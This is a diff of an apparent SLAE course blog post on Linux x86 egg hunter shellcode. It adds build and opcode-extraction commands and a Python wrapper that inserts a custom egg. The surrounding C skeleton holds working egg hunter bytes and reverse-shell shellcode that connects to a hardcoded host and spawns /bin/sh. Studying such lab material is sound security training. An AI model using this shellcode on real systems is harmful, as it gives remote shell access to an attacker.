@@ -60,6 +60,18 @@ NEXT_ADDRESS:                   ; label used for looping
 
 ``` 
 
+Assembly code can be compiled and linked with following commands:
+
+```
+nasm -f elf32 -o egghunter1.o egghunter1.nasm
+ld -z execstack -o egghunter1 egghunter1.o
+```
+
+Following series of piped commands can be used to extract opcode:
+```
+objdump -d egghunter1 |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+```
+
 * Skeleton code with Egg Hunter and reverse shell is following:
 
 ```
@@ -67,8 +79,8 @@ NEXT_ADDRESS:                   ; label used for looping
 
 unsigned char egghunter[] = "\x31\xd2\x42\x81\x3a\x77\x30\x30\x74\x75\xf7\x81\x7a\x04\x77\x30\x30\x75\xee\x83\xc2\x08\xff\xe2";
 unsigned char shellcode[] = "\x77\x30\x30\x74\x77\x30\x30\x74\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x31\xc9\x51\x68\xc0\xa8\xc0\x9f\x66\x68\x11\x5c\x66\x6a\x02\x89\xfb\x89\xe1\xb2\x16\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
-// 1st egg -------------------^^^^^^^^^^^^^^^^^
-// 2nd egg ------------------------------------^^^^^^^^^^^^^
+// 1st egg ------------------^^^^^^^^^^^^^^^^^
+// 2nd egg -----------------------------------^^^^^^^^^^^^^^^
 
 int main()
 {
@@ -242,17 +254,17 @@ ADD EDX, 0x8                  ; if two eggs are found, increase ECX + 8
 JMP EDX                       ; jump to ECX + 8 address where shell code would be located
 ```
 
-Now everyting works fine, reverse shell code is found by Egg Hunter and (reverse) shell code is executed. 
+Now everyting works fine, shell code is found by Egg Hunter and (reverse) shell code is executed. 
 
 ![egghunter2 works](https://smarinovic.github.io/assets/img/slae_00016.png)
 
-Finding an egg with this Egg Hunter takes time and it has impact on performance which is seen when we look at CPU utilization (98.3%).
+Finding an egg with this Egg Hunter takes time and it has impact on performance which can be seen on the right part of the screenshot - CPU utilization (98.3%).
 
 ![cpu utilization](https://smarinovic.github.io/assets/img/slae_00020.png)
 
-According to resources listed in last chapter, Linux memory is splited into pages. Page size is 4096 bytes.
+According to resources listed in last chapter, Linux maps user portion of the virtual address space using 4KB pages. Bytes 0-4095 fall in page 0, bytes 4096-8191 fall in page 1, and so on. 
 If one address from the page is not accessible, all other addresses form the same page are also not accessible. 
-So in order to speed up egghunter we could test if any address from page is accessible and if it is not we can skip to another page which saves us 4095 access attempts per page.
+So in order to speed up egghunter we could test if any address from page is accessible and if it is not we can skip to another page which saves us 4095 access syscalls per page.
 
 ## Egg Hunter - third and final attempt ##
 
@@ -315,12 +327,28 @@ And it works..
 
 ## Wrapper ## 
 
-In order to make Egg Hunter configurable to various shell codes and eggs we can use follwing pyhon script:
+In order to make Egg Hunter configurable to various shell codes and eggs we can use following pyhon script which takes 4 letter egg and creates Egg Hunter code as well as egg to be added as prefix to shellcode:
 
+```
+import sys
 
+egghunter = "\\xbfEGG\\x31\\xc9\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f\\x42\\x31\\xc0\\xb0\\x21\\x8d\\x5a\\x08\\xcd\\x80\\x3c\\xf2\\x74\\xed\\x39\\x3a\\x75\\xee\\x39\\x7a\\x04\\x75\\xe9\\x83\\xc2\\x08\\xff\\xe2";
+# to be replaced--^^^ with 4 bytes egg
 
-.... stil under construction ....
+if len(sys.argv) != 2:
+   print 'Usage: wrapper.py <4 letter egg>'
+   sys.exit(-1)
 
+elif len(sys.argv[1]) != 4:
+   print 'Egg should be 4 bytes long'
+
+else:
+   egg =sys.argv[1]
+   egg_final = "\\x" + egg[0].encode("hex") + "\\x" + egg[1].encode("hex") + "\\x" + egg[2].encode("hex") + "\\x" + egg[3].encode("hex")
+   egghunter = egghunter.replace("EGG", egg_final)
+   print "Egghunter: " + egghunter
+   print "Add: " + egg_final + egg_final + "  at beginning of shell code"
+```
 
 ## References ##
 
@@ -330,3 +358,5 @@ In order to make Egg Hunter configurable to various shell codes and eggs we can 
 * [IllegalBytes blog](https://illegalbytes.com/2018-03-20/slae-assignment-3-linux-x86-egghunting/)
 * [Coffeegist blog](https://coffeegist.com/security/slae-exam-3-egg-hunter-shellcode/)
 * [Ryuke Ackerman's blog](https://medium.com/@ryukeackerman/securitytube-linux-assembly-expert-slae-assignment-writeups-x03-egg-hunter-shellcode-ea53bf7a12eb)
+* [H0mbre's blog](https://github.com/h0mbre/h0mbre.github.io/blob/master/_posts/2019-05-08-SLAE_Egg_Hunter.md)
+
